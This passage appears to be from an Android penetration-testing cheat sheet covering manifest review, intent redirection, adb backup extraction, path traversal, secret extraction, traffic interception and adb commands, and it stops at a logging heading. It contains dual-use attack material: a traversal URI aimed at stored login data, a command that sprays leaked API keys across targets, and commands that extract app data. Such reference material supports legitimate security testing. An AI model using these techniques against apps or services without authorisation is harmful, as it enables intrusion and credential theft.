<div class="highlight"><pre><span></span><code><span class="nt">&lt;activity</span><span class="w"> </span><span class="na">android:label=</span><span class="s">"@string/app_name"</span><span class="w"> </span><span class="na">android:name=</span><span class="s">"com.package.MainActivity"</span><span class="nt">&gt;</span>
<span class="w">    </span><span class="nt">&lt;intent-filter&gt;</span>
<span class="w">        </span><span class="nt">&lt;action</span><span class="w"> </span><span class="na">android:name=</span><span class="s">"android.intent.action.MAIN"</span><span class="nt">/&gt;</span>
<span class="w">        </span><span class="nt">&lt;category</span><span class="w"> </span><span class="na">android:name=</span><span class="s">"android.intent.category.LAUNCHER"</span><span class="nt">/&gt;</span>
<span class="w">    </span><span class="nt">&lt;/intent-filter&gt;</span>
<span class="nt">&lt;/activity&gt;</span>
</code></pre></div>
<h5 id="exported-components">Exported Components</h5>
<p>Locate exported activities, services, broadcast receivers, etc., having the <code>android:exported</code> set to <code>true</code>:</p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;activity</span><span class="w"> </span><span class="na">android:exported=</span><span class="s">"true"</span><span class="w"> </span><span class="na">android:label=</span><span class="s">"@string/title_activity_post_login"</span><span class="w"> </span><span class="na">android:name=</span><span class="s">"com.package.SomeExportedActivity"</span><span class="nt">/&gt;</span>
</code></pre></div>
<p>Exported activity, service, broadcast receiver, etc.) can be launched by components of other applications:</p>
<ul>
<li>If <code>true</code>, any app can access the activity and launch it by its exact class name.</li>
<li>If <code>false</code>, only components of the same application, applications with the same user ID, or privileged system components can launch the activity.</li>
</ul>
<p>In API level 16 and lower the default value is <code>true</code></p>
<p>Mitigation: Always explicitly set the <code>android:exported</code> attribute.</p>
<p>When an app targets Android&nbsp;11 (API level&nbsp;30) or higher and queries for information about the other apps that are installed on a device, the system filters this information by default.</p>
<p>When other applications are not visible to yours, use the <code>&lt;queries&gt;</code> tag in the manifest in order to make them visible (<a href="https://developer.android.com/training/package-visibility">reference</a>):</p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;queries&gt;</span><span class="w">  </span>
<span class="w">    </span><span class="nt">&lt;package</span><span class="w"> </span><span class="na">android:name=</span><span class="s">"&lt;target application package name&gt;"</span><span class="w"> </span><span class="nt">/&gt;</span><span class="w">    </span>
<span class="nt">&lt;/queries&gt;</span>
</code></pre></div>
<p><strong>Note: an activity with an intent-filter is automatically exported by default !</strong></p>
<h5 id="http-enabled">HTTP Enabled</h5>
<p>HTTP is enabled if the property  <code>android:usesCleartextTraffic</code> is set to <code>true</code>:</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="nt">&lt;manifest</span><span class="w"> </span><span class="err">...</span><span class="nt">&gt;</span>
<span class="w">    </span><span class="nt">&lt;uses-permission</span><span class="w"> </span><span class="na">android:name=</span><span class="s">"android.permission.INTERNET"</span><span class="w"> </span><span class="nt">/&gt;</span>
<span class="w">    </span><span class="nt">&lt;application</span>
<span class="w">        </span><span class="err">...</span>
<span class="w">        </span><span class="na">android:usesCleartextTraffic=</span><span class="s">"true"</span>
<span class="w">        </span><span class="err">...</span><span class="nt">&gt;</span>
<span class="w">        </span>...
<span class="w">    </span><span class="nt">&lt;/application&gt;</span>
<span class="nt">&lt;/manifest&gt;</span>
</code></pre></div>
<p>If the application uses a separated network security configuration file specified by the property  <code>android:networkSecurityConfig</code>, check if that file has the property <code>cleartextTrafficPermitted</code> set to <code>true</code>:</p>
<div class="highlight"><pre><span></span><code><span class="cm">&lt;!-- AndroidManifest.xml --&gt;</span>
<span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="nt">&lt;manifest</span><span class="w"> </span><span class="err">...</span><span class="nt">&gt;</span>
<span class="w">    </span><span class="nt">&lt;uses-permission</span><span class="w"> </span><span class="na">android:name=</span><span class="s">"android.permission.INTERNET"</span><span class="w"> </span><span class="nt">/&gt;</span>
<span class="w">    </span><span class="nt">&lt;application</span>
<span class="w">        </span><span class="err">...</span>
<span class="w">        </span><span class="na">android:networkSecurityConfig=</span><span class="s">"@xml/network_security_config"</span>
<span class="w">        </span><span class="err">...</span><span class="nt">&gt;</span>
<span class="w">        </span>...
<span class="w">    </span><span class="nt">&lt;/application&gt;</span>
<span class="nt">&lt;/manifest&gt;</span>

<span class="cm">&lt;!-- network_security_config.xml --&gt;</span>
<span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="nt">&lt;network-security-config&gt;</span>
<span class="w">    </span><span class="nt">&lt;domain-config</span><span class="w"> </span><span class="na">cleartextTrafficPermitted=</span><span class="s">"true"</span><span class="nt">&gt;</span>
<span class="w">        </span><span class="nt">&lt;domain</span><span class="w"> </span><span class="na">includeSubdomains=</span><span class="s">"true"</span><span class="nt">&gt;</span>...<span class="nt">&lt;/domain&gt;</span>
<span class="w">    </span><span class="nt">&lt;/domain-config&gt;</span>
<span class="nt">&lt;/network-security-config&gt;</span>
</code></pre></div>
<h5 id="intent-filters">Intent Filters</h5>
<p>Intent filters are used to declare the capability of an activity to respond to particular intents eventually requested explicitly or implicitly from other apps.
Intent filters are declared in the <code>&lt;intent-filter&gt;</code> tags:</p>
<div class="highlight"><pre><span></span><code><span class="nt">&lt;manifest</span><span class="w"> </span><span class="err">...</span><span class="w"> </span><span class="nt">&gt;</span>
...
<span class="w">    </span><span class="nt">&lt;application</span><span class="w"> </span><span class="err">...</span><span class="nt">&gt;</span>
<span class="w">        </span><span class="nt">&lt;activityandroid:name</span><span class="err">="com.example.project.ComposeEmailActivity"</span><span class="nt">&gt;</span>
<span class="w">            </span><span class="nt">&lt;intent-filter&gt;</span>
<span class="w">                </span><span class="nt">&lt;action</span><span class="w"> </span><span class="na">android:name=</span><span class="s">"android.intent.action.SEND"</span><span class="nt">/&gt;</span>
<span class="w">                </span><span class="nt">&lt;data</span><span class="w"> </span><span class="na">android:type=</span><span class="s">"*/*"</span><span class="nt">/&gt;</span>
<span class="w">                </span><span class="nt">&lt;category</span><span class="w"> </span><span class="na">android:name=</span><span class="s">"android.intent.category.DEFAULT"</span><span class="nt">/&gt;</span>
<span class="w">            </span><span class="nt">&lt;/intent-filter&gt;</span>
<span class="w">        </span><span class="nt">&lt;/activity&gt;</span>
<span class="w">    </span><span class="nt">&lt;/application&gt;</span>
<span class="nt">&lt;/manifest&gt;</span>
</code></pre></div>
<h5 id="reference">Reference</h5>
<p>Updated at: 29/04/2023</p>
<table>
<thead>
<tr>
<th>Element</th>
<th>Parent</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;action&gt;</code></td>
<td><code>&lt;intent-filter&gt;</code></td>
<td>Adds an action to a filters intent.</td>
</tr>
<tr>
<td><code>&lt;activity&gt;</code></td>
<td><code>&lt;application&gt;</code></td>
<td>Declares a component of the activity.</td>
</tr>
<tr>
<td><code>&lt;activity-alias&gt;</code></td>
<td><code>&lt;activity&gt;</code></td>
<td>Declares an alias for the activity.</td>
</tr>
<tr>
<td><code>&lt;application&gt;</code></td>
<td><code>&lt;manifest&gt;</code></td>
<td>It is the application declaration.</td>
</tr>
<tr>
<td><code>&lt;category&gt;</code></td>
<td><code>&lt;intent-filter&gt;</code></td>
<td>Adds a category name to an intent filter.</td>
</tr>
<tr>
<td><code>&lt;compatible-screens&gt;</code></td>
<td><code>&lt;manifest&gt;</code></td>
<td>Specifies each screen setting that the application supports.</td>
</tr>
<tr>
<td><code>&lt;data&gt;</code></td>
<td><code>&lt;intent-filter&gt;</code></td>
<td>Adds a data specification to an intent filter.</td>
</tr>
<tr>
<td><code>&lt;grant-uri-permission&gt;</code></td>
<td><code>&lt;provider&gt;</code></td>
<td>Specifies the subsets of application data that the parent content provider is allowed to access.</td>
</tr>
<tr>
<td><code>&lt;instrumentation&gt;</code></td>
<td><code>&lt;manifest&gt;</code></td>
<td>Declares an Instrumentation class that lets you monitor an application's interaction with the system.</td>
</tr>
<tr>
<td><code>&lt;intent-filter&gt;</code></td>
<td><code>&lt;activity&gt;</code><br/><code>&lt;activity-alias&gt;</code><br/><code>&lt;service&gt;</code><br/><code>&lt;receiver&gt;</code><br/><code>&lt;provider&gt;</code></td>
<td>Specifies what types of intents an activity, service, or broadcast receiver can respond to.</td>
</tr>
<tr>
<td><code>&lt;layout&gt;</code></td>
<td><code>&lt;activity&gt;</code></td>
<td>Contains attributes that affect how an activity behaves in multi-window mode.</td>
</tr>
<tr>
<td><code>&lt;manifest&gt;</code></td>
<td><code>&lt;activity&gt;</code></td>
<td>It is the root element of the AndroidManifest.xml file.</td>
</tr>
<tr>
<td><code>&lt;meta-data&gt;</code></td>
<td><code>&lt;activity&gt;</code><br/> <code>&lt;activity-alias&gt;</code><br/> <code>&lt;application&gt;</code><br/> <code>&lt;provider&gt;</code><br/> <code>&lt;receiver&gt;</code><br/> <code>&lt;service&gt;</code></td>
<td>A name-value pair for an item of additional, arbitrary data that can be supplied to the parent component.</td>
</tr>
<tr>
<td><code>&lt;path-permission&gt;</code></td>
<td><code>&lt;provider&gt;</code></td>
<td>Defines the path and required permissions for a specific subset of data within a content provider.</td>
</tr>
<tr>
<td><code>&lt;permission&gt;</code></td>
<td><code>&lt;manifest&gt;</code></td>
<td>Declares a security permission used to limit access to specific components or features of this or other applications.</td>
</tr>
<tr>
<td><code>&lt;permission-group&gt;</code></td>
<td><code>&lt;manifest&gt;</code></td>
<td>Declares a name for a logical grouping of related permissions. This element doesn't declare a permission itself, only a category in which permissions can be placed.</td>
</tr>
<tr>
<td><code>&lt;permission-tree&gt;</code></td>
<td><code>&lt;manifest&gt;</code></td>
<td>Declares the base name for a tree of permissions.</td>
</tr>
<tr>
<td><code>&lt;profileable&gt;</code></td>
<td><code>&lt;application&gt;</code></td>
<td>Specifies how profilers can access this application.</td>
</tr>
<tr>
<td><code>&lt;property&gt;</code></td>
<td><code>&lt;activity&gt;</code><br/><code>&lt;activity-alias&gt;</code><br/><code>&lt;application&gt;</code><br/><code>&lt;provider&gt;</code><br/><code>&lt;receiver&gt;</code><br/><code>&lt;service&gt;</code></td>
<td>A name-value pair for an item of additional, arbitrary data that can be supplied to the parent component.</td>
</tr>
<tr>
<td><code>&lt;provider&gt;</code></td>
<td><code>&lt;application&gt;</code></td>
<td>Declares a content provider component.</td>
</tr>
<tr>
<td><code>&lt;queries&gt;</code></td>
<td><code>&lt;manifest&gt;</code></td>
<td>Specifies the set of other apps that an app intends to interact with.</td>
</tr>
<tr>
<td><code>&lt;receiver&gt;</code></td>
<td><code>&lt;application&gt;</code></td>
<td>Declares a broadcast receiver.</td>
</tr>
<tr>
<td><code>&lt;service&gt;</code></td>
<td><code>&lt;application&gt;</code></td>
<td>Declares a service.</td>
</tr>
<tr>
<td><code>&lt;supports-gl-texture&gt;</code></td>
<td><code>&lt;manifest&gt;</code></td>
<td>Declares a single GL texture compression format that the app supports.</td>
</tr>
<tr>
<td><code>&lt;supports-screens&gt;</code></td>
<td><code>&lt;manifest&gt;</code></td>
<td>Lets you specify the screen sizes your application supports and enable screen compatibility mode for screens larger than what your application supports.</td>
</tr>
<tr>
<td><code>&lt;uses-configuration&gt;</code></td>
<td><code>&lt;manifest&gt;</code></td>
<td>Indicates the hardware and software features the application requires.</td>
</tr>
<tr>
<td><code>&lt;uses-feature&gt;</code></td>
<td><code>&lt;manifest&gt;</code></td>
<td>Declares a single hardware or software feature that is used by the application.</td>
</tr>
<tr>
<td><code>&lt;uses-library&gt;</code></td>
<td><code>&lt;manifest&gt;</code></td>
<td>Specifies a shared library that the application must be linked against.</td>
</tr>
<tr>
<td><code>&lt;uses-native-library&gt;</code></td>
<td><code>&lt;application&gt;</code></td>
<td>Specifies a vendor-provided shared native library that the application must be linked against. This element tells the system to make the native library accessible for the package.</td>
</tr>
<tr>
<td><code>&lt;uses-permission&gt;</code></td>
<td><code>&lt;manifest&gt;</code></td>
<td>Specifies a system permission that the user must grant for the app to operate correctly.</td>
</tr>
<tr>
<td><code>&lt;uses-permission-sdk-23&gt;</code></td>
<td><code>&lt;manifest&gt;</code></td>
<td>Specifies that an app wants a particular permission, but only if the app is installed on a device running Android 6.0 (API level 23) or higher. If the device runs API level 22 or lower, the app doesn't want the specified permission.</td>
</tr>
<tr>
<td><code>&lt;uses-sdk&gt;</code></td>
<td><code>&lt;manifest&gt;</code></td>
<td>Lets you express an application's compatibility with one or more versions of the Android platform by means of an API level integer.</td>
</tr>
</tbody>
</table>
<h4 id="bypass-provider-restrictions_1">Bypass Provider Restrictions</h4>
<p>Reference: https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers/</p>
<p>Each time an Intent is passed in any way between apps on Android, the system automatically checks the flags <code>FLAG_GRANT_READ_URI_PERMISSION</code>, <code>FLAG_GRANT_WRITE_URI_PERMISSION</code>, etc.</p>
<p>When a content provider has the <code>android:grantUriPermissions</code> set to <code>true</code>, it could be possible to exploit an unsafe code that redirects user controllable intents, allowing to access restricted content providers.</p>
<p>An example of unsafe code is the following:</p>
<div class="highlight"><pre><span></span><code><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">onActivityResult</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">requestCode</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">resultCode</span><span class="p">,</span><span class="w"> </span><span class="n">Intent</span><span class="w"> </span><span class="n">evilIntent</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="p">...</span>
<span class="w">    </span><span class="n">setResult</span><span class="p">(</span><span class="n">resultCode</span><span class="p">,</span><span class="w"> </span><span class="n">evilIntent</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
<h4 id="backup">Backup</h4>
<p><code>adb backup</code> command can also be used for extracting application package backup as follows:</p>
<div class="highlight"><pre><span></span><code>//<span class="w"> </span>get<span class="w"> </span>backup
adb<span class="w"> </span>backup<span class="w"> </span>&lt;package<span class="w"> </span>name&gt;<span class="w"> </span>

//<span class="w"> </span>Extract<span class="w"> </span>backup*
dd<span class="w"> </span><span class="k">if</span><span class="o">=</span>backup.ab<span class="w"> </span><span class="nv">bs</span><span class="o">=</span><span class="m">1</span><span class="w"> </span><span class="nv">skip</span><span class="o">=</span><span class="m">24</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">"import zlib,sys;sys.stdout.write(zlib.decompress(sys.stdin.read()))"</span><span class="w"> </span>&gt;<span class="w"> </span>backup.tar

///<span class="w"> </span>alternative<span class="w"> </span>using<span class="w"> </span>openssl
dd<span class="w"> </span><span class="k">if</span><span class="o">=</span>backup.ab<span class="w"> </span><span class="nv">bs</span><span class="o">=</span><span class="m">1</span><span class="w"> </span><span class="nv">skip</span><span class="o">=</span><span class="m">24</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>openssl<span class="w"> </span>zlib<span class="w"> </span>-d
</code></pre></div>
<p>Note:</p>
<ul>
<li>First 24 bytes contains the header of the backup, so they're skipped</li>
</ul>
<p><strong>Warning</strong> -  <a href="https://developer.android.com/about/versions/12/behavior-changes-12#adb-backup-restrictions">adb backup is deprecated since Android 12</a>:</p>
<div class="highlight"><pre><span></span><code><span class="n">For</span><span class="w"> </span><span class="n">apps</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">Android</span><span class="w"> </span><span class="mi">12</span><span class="w"> </span><span class="p">(</span><span class="n">API</span><span class="w"> </span><span class="n">level</span><span class="w"> </span><span class="mi">31</span><span class="p">)</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">higher</span><span class="p">,</span><span class="w"> </span><span class="n">when</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">runs</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">adb</span><span class="w"> </span><span class="n">backup</span><span class="w"> </span><span class="n">command</span><span class="p">,</span><span class="w"> </span><span class="n">app</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">excluded</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">any</span><span class="w"> </span><span class="n">other</span><span class="w"> </span><span class="n">system</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">exported</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">device</span><span class="o">.</span>

<span class="n">If</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">testing</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">development</span><span class="w"> </span><span class="n">workflows</span><span class="w"> </span><span class="n">rely</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">app</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="n">using</span><span class="w"> </span><span class="n">adb</span><span class="w"> </span><span class="n">backup</span><span class="p">,</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">now</span><span class="w"> </span><span class="n">opt</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">exporting</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">app</span><span class="s1">'s data by setting android:debuggable to true in your app'</span><span class="n">s</span><span class="w"> </span><span class="n">manifest</span><span class="w"> </span><span class="n">file</span><span class="o">.</span>
</code></pre></div>
<p>-<code>adb backup</code> on Android 12 only work if <code>targetSDK</code> is lower than 31 or the app is marked as <code>debuggable=true</code>.</p>
<p>For Android 12 or higher, create a backup as follows:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Create the backup</span>
adb<span class="w"> </span>shell<span class="w"> </span>bmgr<span class="w"> </span><span class="nb">enable</span><span class="w"> </span><span class="nb">true</span>
adb<span class="w"> </span>shell<span class="w"> </span>bmgr<span class="w"> </span>transport<span class="w"> </span>com.android.localtransport/.LocalTransport
adb<span class="w"> </span>shell<span class="w"> </span>settings<span class="w"> </span>put<span class="w"> </span>secure<span class="w"> </span>backup_local_transport_parameters<span class="w"> </span><span class="s1">'is_encrypted=true'</span>
adb<span class="w"> </span>shell<span class="w"> </span>bmgr<span class="w"> </span>backupnow<span class="w"> </span><span class="s1">'&lt;package name&gt;'</span>

<span class="c1"># Copy and extract the backup</span>
adb<span class="w"> </span>root<span class="w"> </span>
adb<span class="w"> </span>pull<span class="w"> </span>/data/data/com.android.localtransport/files/1/_full/<span class="s1">'&lt;package name&gt;'</span><span class="w"> </span><span class="s1">'&lt;package name&gt;.ab'</span><span class="w"> </span>
tar<span class="w"> </span>xvf<span class="w"> </span>&lt;package<span class="w"> </span>name&gt;.ab
</code></pre></div>
<h4 id="lfi-path-traversal">LFI &amp; Path Traversal</h4>
<p>When dealing with WebViews with <code>WebSettings.setAllowFileAccessFromFileURLs(true)</code>, it could be possible to exfiltrate files using XHR requests to <code>file:///file_to_exfiltrate</code> abusing other vulnerabilities such as XSS.</p>
<p>The use of <code>getLastPathSegment()</code> from the <code>Uri</code> class without any validation or sanitization is unsafe as it could lead to path traversal by URL encoding the URI:</p>
<ul>
<li>Example: <code>content://oversecured.ovaa.theftoverwrite/..%2F..%2F..%2Fdata%2Fdata%2Foversecured.ovaa%2Fshared_prefs%2Flogin_data.xml</code></li>
</ul>
<p>When using <code>intent.setData</code> with a URI with <code>file://</code> protocol, from Android Nougat a FileUriExposedException will be received; this could be overcame with the following code:</p>
<div class="highlight"><pre><span></span><code><span class="c1">// See: https://stackoverflow.com/questions/38200282/android-os-fileuriexposedexception-file-storage-emulated-0-test-txt-exposed</span>
<span class="n">StrictMode</span><span class="p">.</span><span class="na">setVmPolicy</span><span class="p">(</span><span class="n">StrictMode</span><span class="p">.</span><span class="na">VmPolicy</span><span class="p">.</span><span class="na">LAX</span><span class="p">);</span>
</code></pre></div>
<h4 id="secrets-extraction">Secrets Extraction</h4>
<p>Extract URIs, endpoints and secrets using <a href="https://github.com/dwisiswant0/apkleaks">apkleaks</a></p>
<div class="highlight"><pre><span></span><code>apkleaks<span class="w"> </span>-f<span class="w"> </span>&lt;apk<span class="w"> </span>to<span class="w"> </span>scan&gt;<span class="w"> </span>-o<span class="w"> </span>&lt;output<span class="w"> </span>result<span class="w"> </span>path&gt;
</code></pre></div>
<p>[Bug Bounty] Spray found API keys across targets with <code>nuclei</code>:</p>
<div class="highlight"><pre><span></span><code>nuclei<span class="w"> </span>-t<span class="w"> </span>nuclei-templates/http/token-spray<span class="w"> </span>-var<span class="w"> </span><span class="nv">token</span><span class="o">=</span>&lt;found<span class="w"> </span>api<span class="w"> </span>key&gt;
</code></pre></div>
<h4 id="app-links">App Links</h4>
<p>Validate Android assetlinks.json with <a href="https://github.com/chayev/yurl">yurl</a>:</p>
<div class="highlight"><pre><span></span><code>yurl<span class="w"> </span>assetlink<span class="w"> </span>validate<span class="w"> </span>&lt;domain&gt;
</code></pre></div>
<h4 id="webviews">WebViews</h4>
<p><code>@JavascriptInterface</code> annotation defines a Java function that  provides the facility to create any method as the javascript Interface which means that method can be used by web components to communicate with Android.</p>
<h3 id="dynamic-analysis_1">Dynamic Analysis</h3>
<p>Useful references:</p>
<ul>
<li><a href="https://asrp.darkwolf.io/intro">ASRP Playbook</a></li>
</ul>
<p>Useful tools:</p>
<ul>
<li><a href="https://github.com/WithSecureLabs/drozer">Drozer</a></li>
<li><a href="https://github.com/m0bilesecurity/RMS-Runtime-Mobile-Security">RMS - Runtime Mobile Security</a></li>
<li><a href="https://github.com/sensepost/objection">Objection</a></li>
<li><a href="https://github.com/nccgroup/house">House</a></li>
<li><a href="https://github.com/Ch0pin/medusa">Medusa</a></li>
<li><a href="https://github.com/foundryzero/binder-trace">Binder Trace</a></li>
</ul>
<p>Interesting paths:</p>
<table>
<thead>
<tr>
<th>Path</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>/data/data/&lt;package&gt;/ databases</code></td>
<td>app databases</td>
</tr>
<tr>
<td><code>/data/data/&lt;package&gt;/ shared_prefs/</code></td>
<td>Shared preferences</td>
</tr>
<tr>
<td><code>/data/app</code></td>
<td>APK installed by user</td>
</tr>
<tr>
<td><code>/system/app</code></td>
<td>Pre-installed APK files</td>
</tr>
<tr>
<td><code>/mmt/asec</code></td>
<td>Encrypted apps / App2SD</td>
</tr>
<tr>
<td><code>/mmt/emmc</code></td>
<td>Internal SD Card</td>
</tr>
<tr>
<td><code>/mmt/adcard</code></td>
<td>External/Internal SD Card</td>
</tr>
<tr>
<td><code>/mmt/adcard/external_sd</code></td>
<td>External SD Card</td>
</tr>
</tbody>
</table>
<h4 id="packages-info">Packages Info</h4>
<p>Dump package info:</p>
<div class="highlight"><pre><span></span><code><span class="o">[</span>adb<span class="w"> </span>shell<span class="o">]</span><span class="w"> </span>pm<span class="w"> </span>dump<span class="w"> </span>&lt;package<span class="w"> </span>name&gt;
</code></pre></div>
<p>Path to the APK for the specified package:</p>
<div class="highlight"><pre><span></span><code><span class="o">[</span>adb<span class="w"> </span>shell<span class="o">]</span><span class="w"> </span>pm<span class="w"> </span>path<span class="w"> </span>&lt;package&gt;
</code></pre></div>
<p>List package names:</p>
<div class="highlight"><pre><span></span><code><span class="o">[</span>adb<span class="w"> </span>shell<span class="o">]</span><span class="w"> </span>pm<span class="w"> </span>list<span class="w"> </span>packages
</code></pre></div>
<h4 id="network-traffic-capture">Network Traffic Capture</h4>
<p>It's possible to intercept packets in real time by using <em>tcpdump</em> and <em>Wireshark</em>:</p>
<div class="highlight"><pre><span></span><code>//<span class="w"> </span>Start<span class="w"> </span>tcpdump<span class="w"> </span>and<span class="w"> </span>pipe<span class="w"> </span>output<span class="w"> </span>to<span class="w"> </span>a<span class="w"> </span>netcat<span class="w"> </span>listener
adb<span class="w"> </span>shell<span class="w"> </span><span class="s2">"tcpdump -s 0 -w - | nc -l -p 4444"</span><span class="w"> </span>

//<span class="w"> </span>Forward<span class="w"> </span>the<span class="w"> </span>port
adb<span class="w"> </span>forward<span class="w"> </span>tcp:4444<span class="w"> </span>tcp:4444

//<span class="w"> </span>Connect<span class="w"> </span>to<span class="w"> </span>netcat<span class="w"> </span>listner<span class="w"> </span>and<span class="w"> </span>pipe<span class="w"> </span>output<span class="w"> </span>to<span class="w"> </span>wireshark
nc<span class="w"> </span>localhost<span class="w"> </span><span class="m">4444</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>wireshark<span class="w"> </span>-k<span class="w"> </span>-S<span class="w"> </span>-i<span class="w"> </span>&ndash;
</code></pre></div>
<p>Set and unset system proxy:</p>
<div class="highlight"><pre><span></span><code><span class="o">[</span>adb<span class="w"> </span>shell<span class="o">]</span><span class="w"> </span>settings<span class="w"> </span>put<span class="w"> </span>global<span class="w"> </span>http_proxy<span class="w"> </span>&lt;proxy<span class="w"> </span>address&gt;:&lt;proxy<span class="w"> </span>port&gt;

<span class="o">[</span>adb<span class="w"> </span>shell<span class="o">]</span><span class="w"> </span>settings<span class="w"> </span>put<span class="w"> </span>global<span class="w"> </span>http_proxy<span class="w"> </span>:0
</code></pre></div>
<h5 id="burp-certificate-installation">Burp Certificate Installation</h5>
<p>Extract the certificate from Burp and convert it to PEM format:</p>
<div class="highlight"><pre><span></span><code>openssl<span class="w"> </span>x509<span class="w"> </span>-inform<span class="w"> </span>der<span class="w"> </span>-in<span class="w"> </span>BurpCA.cer<span class="w"> </span>-out<span class="w"> </span>BurpCA.pem
</code></pre></div>
<p>Rename the cert to the output of the following command:</p>
<div class="highlight"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="k">$(</span>openssl<span class="w"> </span>x509<span class="w"> </span>-inform<span class="w"> </span>PEM<span class="w"> </span>-subject_hash<span class="w"> </span>-in<span class="w"> </span>BurpCA.pem<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-1<span class="w"> </span><span class="k">)</span>.0
</code></pre></div>
<p>Copy and set right permissions to the cert:</p>
<div class="highlight"><pre><span></span><code>adb<span class="w"> </span>root<span class="w"> </span>//<span class="w"> </span><span class="k">if</span><span class="w"> </span>not<span class="w"> </span>already<span class="w"> </span>root
abd<span class="w"> </span>remount
adb<span class="w"> </span>push<span class="w"> </span>&lt;cert<span class="w"> </span>name&gt;<span class="w"> </span>/system/etc/security/cacerts/
adb<span class="w"> </span>shell<span class="w"> </span><span class="s2">"chmod 644 /system/etc/security/cacerts/&lt;cert name&gt;"</span>
adb<span class="w"> </span>shell<span class="w"> </span><span class="s2">"reboot"</span>
</code></pre></div>
<h4 id="activities-services-content-providers-broadcast-receivers_1">Activities, Services, Content Providers, Broadcast Receivers</h4>
<p>Start Activity by name:</p>
<div class="highlight"><pre><span></span><code><span class="o">[</span>adb<span class="w"> </span>shell<span class="o">]</span><span class="w"> </span>am<span class="w"> </span>start<span class="w"> </span>-n<span class="w"> </span>com.android.insecurebankv2/.WrongLogin
</code></pre></div>
<p>Start Activity by deeplink:</p>
<div class="highlight"><pre><span></span><code><span class="o">[</span>adb<span class="w"> </span>shell<span class="o">]</span><span class="w"> </span>am<span class="w"> </span>start<span class="w"> </span>-W<span class="w"> </span><span class="s2">"[schema]://[host]/[path][?queryParams]"</span>
</code></pre></div>
<p>Start Activity Intent:</p>
<div class="highlight"><pre><span></span><code><span class="o">[</span>adb<span class="w"> </span>shell<span class="o">]</span><span class="w"> </span>am<span class="w"> </span>start<span class="p">|</span>startservice<span class="p">|</span>broadcast<span class="w"> </span>&lt;INTENT&gt;<span class="o">[</span>&lt;COMPONENT&gt;<span class="o">]</span>
-a<span class="w"> </span>&lt;ACTION&gt;<span class="w"> </span>e.g.<span class="w"> </span>android.intent.action.VIEW
-c<span class="w"> </span>&lt;CATEGORY&gt;<span class="w"> </span>e.g.<span class="w"> </span>android.intent.category.LAUNCHER
</code></pre></div>
<p>Send Broadcast Intent message:</p>
<div class="highlight"><pre><span></span><code><span class="o">[</span>adb<span class="w"> </span>shell<span class="o">]</span><span class="w"> </span>broadcast<span class="w"> </span>-n<span class="w"> </span>&lt;COMPONENT&gt;<span class="w"> </span><span class="o">[</span>-a<span class="w"> </span>&lt;receivername&gt;<span class="o">]</span><span class="w"> </span>
</code></pre></div>
<p>Reference: <a href="https://developer.android.com/tools/adb#IntentSpec">https://developer.android.com/tools/adb#IntentSpec</a></p>
<p>Dump activity info:</p>
<div class="highlight"><pre><span></span><code><span class="o">[</span>adb<span class="w"> </span>shell<span class="o">]</span><span class="w"> </span>dumpsys<span class="w"> </span>activity
&lt;package&gt;/&lt;activity&gt;
</code></pre></div>
<p>Get content by content provider:</p>
<div class="highlight"><pre><span></span><code>//<span class="w"> </span>Query<span class="w"> </span>content<span class="w"> </span>provider<span class="w"> </span>data
<span class="o">[</span>adb<span class="w"> </span>shell<span class="o">]</span><span class="w"> </span>content<span class="w"> </span>query<span class="w"> </span>--uri<span class="w"> </span>content://uri/to/resources

//<span class="w"> </span>Read<span class="w"> </span>file<span class="w"> </span>content<span class="w"> </span>from<span class="w"> </span>file<span class="w"> </span>content<span class="w"> </span>provider
<span class="o">[</span>adb<span class="w"> </span>shell<span class="o">]</span><span class="w"> </span>content<span class="w"> </span><span class="nb">read</span><span class="w"> </span>--uri<span class="w"> </span>content://uri/to/resources
</code></pre></div>
<p>Take screenshot:</p>
<div class="highlight"><pre><span></span><code><span class="o">[</span>adb<span class="w"> </span>shell<span class="o">]</span><span class="w"> </span>screencap<span class="w"> </span>-p<span class="w"> </span><span class="s2">"/path/to/screenshot.png"</span>
</code></pre></div>
<h4 id="logging">Logging</h4>
<p>View devices logs:</p>
